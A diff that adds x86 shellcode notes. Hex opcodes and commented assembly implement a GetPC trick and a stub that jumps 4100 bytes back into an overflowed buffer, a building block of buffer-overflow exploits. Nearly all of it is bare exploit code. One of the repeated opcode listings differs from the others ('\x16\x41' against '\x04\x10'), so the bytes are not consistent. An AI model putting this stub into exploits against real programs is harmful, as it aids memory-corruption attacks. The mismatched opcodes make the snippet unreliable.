@@ -1,0 +1,23 @@
+call +4      ; \xe8\xff\xff\xff\xff (we land at last \xff after call)
+ret/inc ebx  ; \xc3         // (after call get interpreted as inc ebx, not ret)
+pop ecx      ; \x59         // save return address/ EIP into the ECX register
+xor edx, edx ; \x31\xd2     // clear edx register
+or dx, 4090  ; \x66\x81\xca\x04\x10 // EDX=4100
+sub cx, dx   ; \x66\x29\xd1 // EIP minus 4100
+jmp ecx      ; \xff\xe1     // jump 4100 bytes back in our buffer
+call 0xffe4  ; \xe8\xe8\xff // call short -13
+jmp short -19; \xeb\xeb
+
+
+\xe8\xff\xff\xff\xff
+\xc3
+\x59
+\x31\xd2
+\x66\x81\xca\x16\x41
+\x66\x29\xd1
+\xff\xe1
+\xe8\xe8\xff
+\xeb\xeb
+
+\xe8\xff\xff\xff\xff\xc3\x59\x31\xd2\x66\x81\xca\x04\x10\x66\x29\xd1\xff\xe1\xe8\xe8\xff
+\xeb\xeb
